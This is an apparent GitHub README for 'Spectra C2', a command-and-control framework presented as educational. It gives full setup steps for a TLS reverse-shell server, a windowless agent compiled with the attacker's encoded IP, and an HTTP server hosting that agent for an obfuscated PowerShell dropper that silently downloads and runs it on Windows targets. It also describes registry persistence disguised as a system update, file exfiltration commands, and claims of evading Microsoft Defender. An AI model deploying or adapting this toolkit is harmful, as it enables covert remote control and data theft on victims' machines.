# Spectra C2 - Command & Control Framework

![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)
![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B-blue.svg)
![Server](https://img.shields.io/badge/Server-Linux-orange.svg)
![Target](https://img.shields.io/badge/Target-Windows-lightgrey.svg)
![License](https://img.shields.io/badge/License-MIT-green.svg)
![Educational Project](https://img.shields.io/badge/Purpose-Educational-red)

A lightweight Command & Control framework built for educational purposes. Spectra C2 provides a TLS-encrypted reverse shell with session management, file transfer capabilities, automatic persistence, and an obfuscated dropper - designed to demonstrate real-world offensive security techniques in a controlled lab environment.

> **Disclaimer:** This project is intended exclusively for educational and authorized security research purposes. Unauthorized use against systems you do not own or have explicit permission to test is illegal and unethical.

---

## Architecture Overview

The framework consists of three components that operate in distinct phases:

```
  [1] DELIVERY               [2] CONNECTION              [3] CONTROL

  Linux                      Windows                     Linux
  (HTTP Server)              (Target)                    (C2 Server)
       |                          |                          |
       |  --- agent.exe --->      |                          |
       |                    dropper.ps1                      |
       |                    downloads and                    |
       |                    executes agent                   |
       |                          |                          |
       |                          | ---- TLS (port 443) ---> |
       |                          |        passphrase        |
       |                          | <------ commands ------- |
       |                          | ------ responses ------> |
```

1. The **C2 server** starts on the attacker's Linux machine, listening for TLS connections
2. An HTTP server serves the compiled agent binary
3. The **dropper** (PowerShell) runs on the target Windows machine, downloads the agent and executes it silently
4. The **agent** installs persistence, connects back to the C2 server over TLS, authenticates via passphrase, and awaits commands
5. The operator interacts with the target through an interactive shell with file transfer support

---

## Features

**Server (server_c2.py)**
- TLS-encrypted communication using self-signed certificates
- Passphrase authentication with SHA256 hashing (no plaintext storage)
- IP-based rate limiting on authentication (lockout after 3 failed attempts)
- Multi-client session management with unique IDs and connection tracking
- Bidirectional file transfer (upload to target / download from target)
- Interactive remote shell with persistent working directory
- Color-coded terminal interface with command history

**Agent (agent.py)**
- Reverse shell over TLS with automatic reconnection (10s interval)
- Persistence via Windows Registry (`HKCU\...\Run`) and binary relocation to `%APPDATA%`
- File upload and download support with size verification
- Filesystem navigation with persistent `cwd` across commands
- Base64-encoded C2 address and passphrase

**Dropper (dropper.ps1)**
- Multi-layered obfuscation: Base64, ASCII ordinals, hex encoding, string concatenation, splatting, dynamic invocation
- Silent execution via hidden window re-launch
- Dead code insertion for hash variance
- Protocol reconstruction at runtime

---

## Requirements

| Component | Platform | Requirements |
|-----------|----------|-------------|
| C2 Server | Linux (any distro) | Python 3.8+, OpenSSL |
| Agent | Windows 10/11 | Python 3.8+ and PyInstaller (for compilation only) |
| Dropper | Windows 10/11 | PowerShell 5.1+ |

The server uses only Python standard library modules — no external dependencies.

---

## Setup

### 1. Clone the Repository

```bash
git clone https://github.com/thevirtueye/spectra-c2.git
cd spectra-c2
```

### 2. Generate the TLS Certificate

On the Linux machine, generate a self-signed certificate:

```bash
openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes -subj "/CN=localhost"
```

### 3. Configure the Server

Copy the example configuration and edit it with your values:

```bash
cp config.example.json config.json
```

Edit `config.json`:

```json
{
    "host": "YOUR_IP_HERE",
    "port": 443,
    "passphrase_hash": "YOUR_PASSPHRASE_SHA256_HASH_HERE"
}
```

To generate the SHA256 hash of your passphrase:

```bash
python3 -c 'import hashlib; print(hashlib.sha256("YOUR_PASSPHRASE".encode()).hexdigest())'
```

### 4. Configure the Agent

In `agent.py`, replace the placeholder values with your own Base64-encoded IP and passphrase:

```python
v_h = base64.b64decode("YOUR_IP_BASE64_HERE").decode()
v_p = 443
v_pass = base64.b64decode("YOUR_PASSPHRASE_BASE64_HERE").decode()
```

To encode a value in Base64:

```bash
echo -n "YOUR_VALUE" | base64
```

### 5. Configure the Dropper

In `dropper.ps1`, replace the Base64-encoded IP:

```powershell
$i_b64 = "YOUR_IP_BASE64_HERE"
```

### 6. Compile the Agent on Windows

Install PyInstaller:

```
pip install pyinstaller
```

If the command is not recognized, use: 

```
py -m pip install pyinstaller
```

Compile the agent into a standalone executable:

```
pyinstaller --onefile --noconsole --name agent agent.py
```
Alternatively: 

```
py -m PyInstaller --onefile --noconsole --name agent agent.py
```

The compiled binary will be in the `dist/` folder.

> **Note:** The agent must be compiled on Windows. PyInstaller generates executables for the platform it runs on — compiling on Linux would produce a Linux binary, not a Windows `.exe`.

### 7. Transfer the Binary to Linux

Move `agent.exe` from the Windows `dist/` folder to the `exe/` directory on the Linux machine:

```bash
mkdir -p exe
# Transfer agent.exe into exe/ via SCP, shared folder, or HTTP
```

---

## Usage

### Start the HTTP Server

This serves the agent binary for the dropper to download. Open a terminal:

```bash
cd exe
sudo python3 -m http.server 80
```

### Start the C2 Server

Open a second terminal:

```bash
sudo python3 server_c2.py
```

> `sudo` is required because port 443 is a privileged port (below 1024) on Linux.

The server interface will appear:

```
  ╔════════════════════════════════╗
  ║           SERVER C2            ║
  ║        0.0.0.0 : 443           ║
  ╚════════════════════════════════╝

  Commands: sessions  interact <id>  exit
```

### Execute the Dropper on Windows

Right-click `dropper.ps1` and select **Run with PowerShell**.


### Interact with the Target

Once the agent connects, the server will display:

```
  New connection: <TARGET_IP>
```

**Main menu commands:**

| Command | Description |
|---------|-------------|
| `sessions` | List connected clients with connection duration |
| `interact <id>` | Open a session with the specified client |
| `exit` | Shut down the server |

**Session commands:**

| Command | Description |
|---------|-------------|
| `back` | Return to main menu (session stays active) |
| `cd <path>` | Change directory on target |
| `cd` | Show current directory |
| `upload <local> <remote>` | Send a file to the target |
| `download <remote>` | Retrieve a file from the target |
| Any other command | Executed in the target's shell |

**Upload example (Linux to Windows):**

```
upload uploads/payload.txt C:\Users\John\Desktop\payload.txt
```

**Download example (Windows to Linux):**

```
download C:\Users\John\Desktop\document.txt
```

Downloaded files are saved in `downloads/` as `IP_filename`.

---

## Persistence

The agent installs persistence automatically on first execution:

1. Copies itself to `%APPDATA%\Microsoft\SystemUpdate\update_system.exe`
2. Creates a Registry key at `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` named `UpdateSystem`
3. On every subsequent login, Windows launches the agent automatically

The agent reconnects to the C2 server every 10 seconds if the connection is lost.

---

## Removal

To completely remove the agent from a target machine:

```powershell
# Terminate the process
taskkill /F /IM update_system.exe

# Remove persistence from Registry
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdateSystem /f

# Delete the agent binary
Remove-Item "$env:APPDATA\Microsoft\SystemUpdate\update_system.exe" -Force

# Delete the temporary copy
Remove-Item "$env:TEMP\update_system.exe" -Force
```

---

## Security Hardening

This framework implements the following security measures, applied incrementally during development:

| Measure | Description |
|---------|-------------|
| Detection Testing | The compiled agent was tested with Microsoft Defender fully enabled (real-time protection, tamper protection, firewall, and SmartScreen). **No alerts were triggered during execution in this controlled laboratory environment** |
| TLS Encryption | All C2 traffic is encrypted using TLS 1.3 with self-signed certificates |
| Hashed Authentication | The passphrase is stored as a SHA256 hash in the server configuration — never in plaintext |
| Rate Limiting | After 3 failed authentication attempts from the same IP, connections are rejected for 60 seconds |
| External Configuration | Sensitive server parameters are stored in `config.json` |
| Port 443 | C2 traffic uses the standard HTTPS port to blend with normal web traffic |
| File Integrity | All file transfers (upload/download) are verified using SHA256 hash comparison to ensure data integrity |

---

## Security Considerations

This is an educational project. The following limitations are known and intentional:

- **Agent decompilation** — The agent is compiled with PyInstaller, which bundles the Python interpreter and source code. Tools like `pyinstxtractor` and `decompyle3` can extract the original Python code, revealing the C2 IP address and Base64-encoded passphrase. In a real-world scenario, native compilation (C, Go, Rust) or commercial packers would be used.
- **Base64 is not encryption** — The agent uses Base64 encoding for the server IP and passphrase. This provides minimal obfuscation against casual inspection but offers no cryptographic protection.
- **Self-signed certificate** — The TLS certificate is self-signed and the agent does not verify it (no CA validation). This protects against passive eavesdropping but not against active man-in-the-middle attacks.
- **Network visibility** — Active connections are visible via `netstat` or similar tools on the target machine. Using port 443 reduces suspicion but does not hide the connection. Domain fronting or legitimate CDN infrastructure would be needed for true stealth.
- **Local network only** — The current configuration uses a private IP address. For internet-based operation, the server would need to run on a public VPS or behind port forwarding.
- **Windows-only target** — The agent uses Windows-specific APIs (Registry, `%APPDATA%`). A Linux target would require a separate agent with platform-appropriate persistence mechanisms (crontab, systemd).

---

## Project Structure

```
spectra-c2/
├── .gitignore
├── config.example.json      # Template — copy to config.json and add your values
├── server_c2.py             # C2 server
├── agent.py                 # Agent source (compile with PyInstaller)
├── dropper.ps1              # PowerShell dropper
├── README.md
└── LICENSE
```

Runtime directories (created automatically by the server):

```
├── downloads/               # Files downloaded from targets
└── uploads/                 # Files to upload to targets
```

User-created directory:

```
└── exe/                     # Place compiled agent.exe here (create manually)
```

---

## License

This project is released under the **MIT License**.  
Free to use for educational and research purposes. Please credit the author where applicable.


## Author

Created by **Alberto Cirillo** — 2026
